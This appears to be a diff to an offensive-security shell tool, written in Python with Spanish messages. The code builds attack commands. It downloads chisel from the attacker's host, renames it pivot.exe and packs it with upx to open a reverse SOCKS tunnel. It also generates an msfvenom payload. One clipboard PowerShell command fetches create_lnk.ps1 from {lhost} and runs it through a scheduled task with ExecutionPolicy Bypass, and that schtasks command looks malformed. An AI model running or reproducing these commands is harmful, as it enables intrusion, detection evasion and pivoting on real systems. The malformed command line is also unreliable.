@@ -1886,14 +1886,14 @@ class LazyOwnShell(Cmd):
 
         if len(args) == 1:
             lport = args[0]
-            print_msg(f'Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {lport} --reverse -v {RESET} and copied .\chisel.exe client -v {lhost}:{lport} R:127.0.0.1:socks  to clipboard :D')
-            command = f"""iwr -uri http://{lhost}/chisel.exe -OutFile chisel.exe ;"""
-            command += ' .\\\\'
-            command +=  f"""chisel.exe client -v {lhost}:{lport} R:127.0.0.1:socks"""
+            print_msg(f'Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {lport} --reverse -v {RESET} and copied .\pivot.exe client -v {lhost}:{lport} R:127.0.0.1:socks  to clipboard :D')
+            command = f"""iwr -uri http://{lhost}/chisel.exe -OutFile pivot.exe ;"""
+            command += ' .\\'
+            command +=  f"""pivot.exe client -v {lhost}:{lport} R:127.0.0.1:socks"""
             cmdd = f"echo '{command}' | xclip -sel clip"
             print_msg(f"{MAGENTA}Command to copy: {GREEN}{command}{RESET}")
             os.system(cmdd)
-            os.system(f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe  && chmod +x chisel* && ./chisel_1.9.1_linux_amd64 server --reverse -p {lport} --socks5 -v")
+            os.system(f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe && upx chisel.exe && chmod +x chisel* && ./chisel_1.9.1_linux_amd64 server --reverse -p {lport} --socks5 -v")
             print_msg(f"Shutdown chisel tunnel at sessions in port {RED} {line} {RESET}")
 
         else:
@@ -2032,7 +2032,7 @@ class LazyOwnShell(Cmd):
                 payload_path = os.path.join(web_root, "payload.exe")
                 msfvenom_cmd = f"msfvenom -p {setpayload} LHOST={lhost} LPORT={lport} -f exe -o {payload_path}"
                 subprocess.run(msfvenom_cmd, shell=True, check=True)
-                print_msg("Payload creado con éxito en", payload_path)
+                print_msg("Payload creado con éxito en: " + payload_path)
 
                 # Paso 2: Crear el archivo XML para la descarga
                 xml_content = f"""<?xml version="1.0"?>
@@ -2046,7 +2046,7 @@ class LazyOwnShell(Cmd):
                 xml_path = os.path.join(web_root, "download_payload.xml")
                 with open(xml_path, 'w') as xml_file:
                     xml_file.write(xml_content)
-                print_msg("Archivo XML creado con éxito en", xml_path)
+                print_msg("Archivo XML creado con éxito en " + xml_path)
 
                 # Este paso debe realizarse manualmente: Inserta la macro en tu documento de Office y guárdalo en la ruta especificada.
                 print_msg(f"Asegúrate de que el payload esté en: {payload}")
@@ -2066,7 +2066,7 @@ class LazyOwnShell(Cmd):
                 print_msg("Ejecuta este script en la máquina Windows para crear el archivo .lnk contenido:")
                 print(ps_script_content)
                 # Nota: Este paso debe ejecutarse en la máquina Windows
-                cmd = """echo 'powershell -Command \\"Invoke-WebRequest -Uri \'http://{lhost}/download_payload.xml\' -OutFile \'C:\\Windows\\Temp\\download_payload.xml\'; schtasks /create /tn \'DownloadPayload\' /xml \'C:\\Windows\\Temp\\download_payload.xml\' /f; schtasks /run /tn \'DownloadPayload\' ; powershell -ExecutionPolicy Bypass -File create_lnk.ps1' | xclip -sel clip"""
+                cmd = f"""echo 'powershell -Command \\"Invoke-WebRequest -Uri \'http://{lhost}/create_lnk.ps1\' -OutFile \'C:\\Windows\\Temp\\create_lnk.ps1\'; schtasks /create /tn \'DownloadPayload\' /ps1 \'C:\\Windows\\Temp\\create_lnk.ps1\' /f; schtasks /run /tn \'DownloadPayload\' ; powershell -ExecutionPolicy Bypass -File create_lnk.ps1' | xclip -sel clip"""
                 print_msg(f"El payload y los archivos necesarios han sido generados exitosamente. el comando {cmd} se copio en la clipboard, ejecute www para diponer los archivos mediante un servidor web")
                 os.system(cmd)
                 return
